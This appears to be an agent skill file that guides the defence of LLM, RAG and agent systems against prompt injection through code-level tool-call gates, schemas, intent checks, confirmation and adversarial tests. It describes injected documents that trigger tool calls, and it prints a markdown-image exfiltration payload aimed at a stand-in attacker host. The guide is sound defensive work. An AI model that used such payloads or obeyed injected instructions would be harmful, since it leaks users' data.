---
name: treating-external-content-as-data
description: Use when an LLM, RAG system, or agent reads untrusted documents, uploaded PDFs, emails, tickets, or web pages, when it has tools with side effects (send email, write files, run SQL, call APIs), when LLM output is executed, rendered, or interpreted, or when the proposed defense against prompt injection is "a firmer system prompt".
---

# Treating External Content as Data

## Overview

Anything the model reads from a document, email, or page sits in the same context as your instructions. No prompt wording reliably separates the two. **Core principle:** the model proposes and the code decides. Every tool call crosses a deterministic gate before it runs: an allowlist, a strict schema, sensitive arguments pinned by the server, a user-intent check, and human confirmation for external effects. Delimiters and a firmer prompt can sit on top of that gate. They cannot replace it.

**Violating the letter is violating the spirit:** "the prompt now forbids it" means the defense is still a probability.

## The Gate (every tool call, in order)

| Check | Rule |
|---|---|
| Allowlist | Explicit `name → ToolSpec` registry. Never `globals()[name]` or `getattr(module, name)` |
| Strict schema | Pydantic model with `extra="forbid"`. A forbidden field (such as `to` or `path`) is **rejected and logged**. Never drop it with `args.pop(...)`, because that hides the attack signal |
| Server-pinned arguments | Recipient, user id, tenant, output path, and SQL scope come from the authenticated session, never from the model or the context |
| User intent | A side-effect tool runs only if the **user's own message** asked for it. Detect this outside the model, from the user turn rather than from the retrieved text |
| Confirmation | External effects (send, post, delete, pay) show the exact action and args and wait for the user. A UI is not required: return `pending_confirmation` and let the next user turn approve it |
| Audit | Log every blocked or executed call with tool name and reason. Never log the body or recipient (REQUIRED SUB-SKILL: protecting-pii-lgpd) |

Working gate plus delimiter helper: `treating-external-content-as-data_template.py` (verified with pydantic 2.14).

## Output That Gets Interpreted

| LLM output used as | Control |
|---|---|
| SQL | Read-only DB role with a statement allowlist. Parametrized queries where possible |
| Code or shell | Do not execute it. If you must, use a sandbox with no network and no secrets |
| Markdown or HTML rendered for users | Strip images and auto-loaded URLs (`![](https://attacker/?q=<data>)` exfiltrates on render). Show link domains |
| Next agent step | Same gate. In agents, page text from a fetch tool is untrusted content too (REQUIRED SUB-SKILL: building-llm-agents-langgraph) |

## Proof Before "Fixed"

"Compiles" is not evidence. Write an adversarial test with a **scripted model that obeys the injection**: it emits the attacker's tool call. Then assert that nothing was sent. Run the same scripted model against the old code once, stubbing its imports, and watch it send: a test that never failed proves nothing. The test needs no LLM client and no network, so "the provider client is not available locally" is no excuse. Add the injected document to the RAG eval set as an adversarial slice and keep it there (REQUIRED SUB-SKILL: building-rag-pipelines).

## Rationalizations

| Excuse | Reality |
|---|---|
| "The lead asked only for a firmer prompt" | Deliver the prompt **and** the gate. The gate is about 30 lines and the template already has them. Say why in one line |
| "Confirmation needs front-end work, too big before the demo" | `pending_confirmation` returned as text is a confirmation. No UI change is needed |
| "I ignore `to` silently, so it's safe" | Silent dropping removes the alarm. Reject the call and log it |
| "Couldn't run it, the LLM client isn't here" | The adversarial test uses a scripted model. Run it |
| "Recipient is pinned, so the body doesn't matter" | Without an intent check, any document can trigger mail to the user. Spam today becomes phishing tomorrow |
| "Answer-text manipulation is for after the demo" | Rendered image or link URLs leak data in the demo too. Strip them now |
| "Plain links need a click, only images matter" | A click on `https://attacker/?q=<data>` still leaks the data. Show the domain, or drop links to domains that are not on your allowlist |
| "Pass `confirm=lambda *_: True` for the demo user" | Auto-approval switches off the only human check, and demo settings leak into production. Demo the `pending_confirmation` → approve turn instead |

## Red Flags: Stop

- The fix is only prompt text or delimiters
- Tool dispatched by name lookup in a module namespace
- A sensitive argument comes from the model, even if it is "validated"
- A side-effect tool runs without a check on the user's own request
- "Fixed" claimed with no test where a scripted model obeys the injection
- A confirm callback that always returns `True`

**All of these mean: put the gate in code and prove it with the adversarial test.**
